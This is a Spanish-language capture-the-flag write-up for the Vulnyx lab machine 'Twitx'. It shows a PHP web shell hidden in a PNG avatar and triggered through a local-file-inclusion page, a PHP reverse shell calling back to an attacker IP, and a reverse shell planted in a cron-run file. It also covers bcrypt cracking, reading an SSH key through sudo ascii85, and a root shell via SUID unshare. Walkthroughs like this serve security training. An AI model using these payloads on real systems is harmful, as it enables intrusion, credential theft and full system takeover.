---
author: Lenam
pubDatetime: 2024-07-18T15:22:00Z
title: WriteUp Twitx - Vulnyx
slug: twitx-writeup-vulnyx-es
featured: false
draft: false
ogImage: "assets/twitx/OpenGraph.png"
tags:
  - writeup
  - vulnyx
  - LFI
  - password cracking
  - sudo
  - suid
description:
  CTF dedicado a streamers y creadores de contenido que me enseñaron algunas técnicas de hacking.
lang: es
---

La máquina tiene dos banderas, una para el usuario y otra para root.

Es el primer CTF creado por mí. Seguramente encontrarás otros métodos de entrada además de los previstos.

CTF dedicado a streamers y creadores de contenido que me enseñaron algunas técnicas de hacking. Puedes usarlo para cualquier propósito, ya que normalmente no hago suscripciones, esta es mi contribución.

Espero que lo disfrutes.

## Tabla de contenido 

## Enumeración, puertos y servicios

`$ nmap -p- 192.168.1.195 -oN nmap.txt -vvv`

![img_p1_1](/assets/twitx/img_p1_1.png)

Encontramos 2 puertos abiertos, 22 y 80 (SSH y HTTP). Echamos un vistazo más de cerca a estos dos puertos para intentar obtener más información.

`$ nmap -sV -sC -A -p 80,22 192.168.1.195 -oN nmap2.txt -vvv`

![img_p1_2](/assets/twitx/img_p1_2.png)

El servicio web en el puerto 80 parece tener la página predeterminada de:

![img_p2_1](/assets/twitx/img_p2_1.png)

Realizamos una enumeración de directorios con dirb:

`$ dirb http://192.168.1.195`

![img_p2_2](/assets/twitx/img_p2_2.png)

Encontramos varias rutas, pero las que más nos interesan son: /note y /info.php.

En “/info.php” encontramos la típica salida de “phpInfo()” con mucha información sobre el sistema, por lo que sabemos que el servidor tiene PHP instalado, qué módulos de PHP están habilitados, qué funciones del tipo exec, eval, include podemos usar, etc.

![img_p3_1](/assets/twitx/img_p3_1.png)

En “/note” solo hay un archivo de texto con el siguiente mensaje:

*Recuerda comprar el certificado para el dominio twitx.nyx para el lanzamiento.*

Agregamos el dominio twitx.nyx al archivo hosts:

`echo "192.168.1.195 twitx.nyx" >> /etc/hosts`

![img_p3_2](/assets/twitx/img_p3_2.png)

## Enumeración 2, servicio web

Después de agregar el dominio “twitx.nyx” al archivo /etc/hosts, accedemos a él a través del navegador y encontramos un sitio web de streamers.

![img_p4_1](/assets/twitx/img_p4_1.png)

En el sitio web, observamos varias cosas a primera vista:

- Hay una cuenta regresiva para el próximo lanzamiento en unas 24 horas.
- Las secciones "Streamers" y "About" valen la pena revisar ;)
- Hay un formulario de registro donde puedes subir un archivo para la imagen del avatar, esto parece muy interesante.

Enumeración de directorios con dirb:

`$ dirb http://twitx.nyx`

Encontramos diferentes carpetas con imágenes y archivos PHP, las más interesantes para la intrusión son las siguientes:

```
/upload
/user
/includes
```

Analizamos el código del sitio donde encontramos diferentes cosas interesantes a primera vista.

Hay dos códigos ofuscados dentro de la programación del sitio, el primero se encuentra en /index.php en la línea 522.

![img_p5_1](/assets/twitx/img_p5_1.png)

El otro código ofuscado está al final del archivo /js/scripts.js.

![img_p5_2](/assets/twitx/img_p5_2.png)

Este último tiene un comentario antes que dice "Countdown", lo que podría sugerir que tiene que ver con la cuenta regresiva en la página.

También encontramos una variable declarada al final del archivo “/index.php” llamada `dateFinish`. Si buscamos esta variable en la programación, veremos que se usa dentro del código JavaScript ofuscado.

![img_p5_3](/assets/twitx/img_p5_3.png)

Otra cosa interesante que vemos en la línea 245 es que el formulario se envía a “/?send”.

![img_p5_4](/assets/twitx/img_p5_4.png)

Y quizás lo más interesante es el formulario de registro.

![img_p5_5](/assets/twitx/img_p5_5.png)

En este formulario, debajo de "imagen del avatar" hay un comentario: Max upload: 2MB., solo PNG y 150x150 como máximo, se aceptan resoluciones más altas pero serán transformadas.

## Intrusión

Hay diferentes formas de lograr la intrusión, en esta ocasión, explicaré lo que creo que es la forma más fácil de obtener acceso inicial a la shell del servidor.

### Shell para www-data

Para obtener el primer acceso, primero necesitamos preparar una imagen para nuestro avatar con una web shell, es importante que esta imagen sea menor a 150 píxeles para que al subirla no sea transformada, lo que causaría que la shell incluida en la imagen se pierda o se corrompa.

También es importante que la imagen esté en formato PNG, y no basta con solo cambiar la extensión; también se verifica el mimetype, por lo que es mejor usar una imagen real.

Creando una imagen con una web shell PHP incrustada, para evitar que la imagen se vea afectada, podemos incluirla, por ejemplo, como un comentario en la imagen. Prefiero este método ya que la imagen no se altera.

```
$ exiftool -comment='<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' avatar.png
```

Otra forma es incluirla directamente en la imagen, pero solo incluirla una vez.

```
$ echo '<?php if(isset($_REQUEST["cmd"])){  echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' >> avatar.png
```

Nos registramos con un usuario usando la imagen creada como el avatar del usuario, y anotamos la contraseña.

Ahora necesitamos hacer creer al sitio que ha llegado la hora del lanzamiento, podemos hacerlo de diferentes maneras. Cambiando la fecha en nuestra computadora, también podemos desofuscar el código y terminar viendo el formulario de inicio de sesión y cuál es el endpoint/URL POST donde se envían las credenciales, o simplemente modificando la variable dateFinish que encontramos.

Para modificar esta variable, abrimos la consola del navegador presionando la tecla F12 y cambiamos la fecha de lanzamiento a la fecha actual ingresando:

```
dateFinish = new Date();
```

![img_p6_2](/assets/twitx/img_p6_2.png)

Haciendo esto se mostrará el enlace de Log-in para iniciar sesión con el usuario creado.

![img_p7_1](/assets/twitx/img_p7_1.png)

Iniciamos sesión con el usuario creado anteriormente y ahora podemos ver el enlace "My Profile" en el menú.

El enlace nos lleva a una URL muy interesante donde podemos ver los datos de nuestro usuario y la imagen cargada.

[](http://twitx.tv/private.php?folder=user&file=profile.php)http://twitx.nyx/private.php?folder=user&file=profile.php

![img_p7_2](/assets/twitx/img_p7_2.png)

Este enlace parece tener un LFI pero está muy sanitizado y solo permite cargar un archivo (parámetro file) desde una carpeta (parámetro folder).

Revisamos la dirección de nuestra imagen de avatar, en mi caso la dirección es:
/upload/17777047896641350dc29929.54816126.png

Cargamos la siguiente dirección en el navegador, modificando los parámetros folder y file a los de la imagen del avatar y agregando el parámetro cmd.

http://twitx.nyx/private.php?folder=upload&file=17777047896641350dc29929.54816126.png&cmd=whoami

![img_p8_1](/assets/twitx/img_p8_1.png)

Ahora es momento de intentar hacer una reverse shell con lo que hemos logrado.

Empezamos configurando un listener netcat en el puerto deseado.

![img_p8_2](/assets/twitx/img_p8_2.png)

Dado que sabemos que el servidor tiene PHP instalado, usamos la siguiente reverse shell:

`php -r '$sock=fsockopen("10.0.2.15",4443);exec("/bin/bash <&3 >&3 2>&3");'`

Pero primero, la codificamos en URL:

`php%20-r%20%27%24sock%3Dfsockopen%28%2210.0.2.15%22%2C443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27`

Ahora solo necesitamos cargar la siguiente URL:

`http://twitx.nyx/private.php?folder=upload&file=17777047896641350dc29929.54816126.png&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.0.2.15%22%2C443%

29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27`

Y obtenemos acceso a la shell:

![img_p8_3](/assets/twitx/img_p8_3.png)

## Movimiento lateral hacia el usuario timer

Ahora podemos enumerar los usuarios del sistema.

![img_p9_1](/assets/twitx/img_p9_1.png)

Vemos algunos usuarios interesantes: lenam y timer. También podemos ver toda la programación del sitio twitx.nyx, donde encontramos dos cosas muy interesantes en la carpeta `/var/www/twitx.nyx/includes`.

Archivo **config.php** donde podemos ver las credenciales de la base de datos.

![img_p9_2](/assets/twitx/img_p9_2.png)

Archivo **taak.php**, que parece muy interesante debido a los comentarios que aparecen en él. Tenemos permisos de escritura, y es muy probable que sea ejecutado por una tarea programada.

![img_p9_3](/assets/twitx/img_p9_3.png)

### Hash de la base de datos

Ingresamos a la base de datos y verificamos que hay una tabla llamada `users` con los siguientes datos:

![img_p10_1](/assets/twitx/img_p10_1.png)

Encontramos un hash para el usuario “Lenam”, quien tiene el rol de “adm”. Intentamos forzarlo con john y la wordlist rockyou.

Primero, verificamos qué tipo de hash es; parece ser bcrypt.

![img_p10_2](/assets/twitx/img_p10_2.png)

Intentamos forzarlo con john the ripper y encontramos la contraseña “patricia”, john la encontrará muy rápido.

![img_p10_3](/assets/twitx/img_p10_3.png)

Esta contraseña actualmente no nos es útil, podemos iniciar sesión en el sitio con el usuario [lenamgenx@protonmail.com](mailto:lenamgenx@protonmail.com) y la contraseña “patricia”, pero no nos otorga más privilegios en este momento. Ya podemos ver toda la programación del sitio.

### Archivo taak.php

El archivo taak.php parece ser una tarea programada. También tenemos permisos de escritura en él:

![img_p11_2](/assets/twitx/img_p11_2.png)

Preparamos una reverse shell en PHP para incluirla en el archivo taak.php y configuramos un listener. Usamos la reverse shell en PHP de rebshells.com por “PHP Ivan Sincek” y la incluimos al final del archivo taak.php, pero cuidado de no incluir el primer `<?`, como esto:

![img_p11_3](/assets/twitx/img_p11_3.png)

Configuramos un listener y en un minuto o menos, somos el usuario timer.

`$ nc -lvnp 8080`

![img_p12_1](/assets/twitx/img_p12_1.png)

## Movimiento lateral de timer a lenam

Vemos la tarea programada que nos permitió movernos a este usuario:

![img_p12_3](/assets/twitx/img_p12_3.png)

Además, el usuario timer tiene permisos sudo sin contraseña para ejecutar el binario `/usr/bin/ascii85`.

![img_p12_2](/assets/twitx/img_p12_2.png)

Este ejecutable se utiliza para codificar bytes a texto en base85, y al no validar adecuadamente los permisos de sudo dentro del ejecutable, podemos leer cualquier archivo en el sistema.

Más información: [https://gtfobins.github.io/gtfobins/ascii85/](https://gtfobins.github.io/gtfobins/ascii85/)

Usamos esto para ver si algún usuario tiene una clave privada id_rsa, y encontramos una para el usuario lenam.

`timer@twitx:~$ sudo /usr/bin/ascii85 "/home/lenam/.ssh/id_rsa" | ascii85 –decode`

![img_p13_1](/assets/twitx/img_p13_1.png)

Aprovechamos esta clave privada, la copiamos en un archivo en nuestra máquina y aplicamos los permisos necesarios para usarla vía ssh. Nos pide una contraseña, utilizamos la contraseña “patricia” obtenida al descifrar el hash de la base de datos de lenam.

`$ ssh -i id_rsa lenam@192.168.1.195`

![img_p13_2](/assets/twitx/img_p13_2.png)

Ahora somos el usuario lenam.

## Escalada de privilegios de lenam a root

Buscamos archivos con SUID.

`~$ find / -perm -u=s -type f 2>/dev/null`

![img_p14_1](/assets/twitx/img_p14_1.png)

y encontramos el archivo `/home/lenam/look/inside/unshare`.

Es un ejecutable utilizado para crear nuevos namespaces y ejecutar programas en ellos, tenemos la opción de escalar privilegios.

Más información:

[https://gtfobins.github.io/gtfobins/unshare/](https://gtfobins.github.io/gtfobins/unshare/)

Entonces ejecutamos:

`~/look/inside$ ./unshare -r /bin/sh`

![img_p14_2](/assets/twitx/img_p14_2.png)

¡Felicidades, CTF completado!
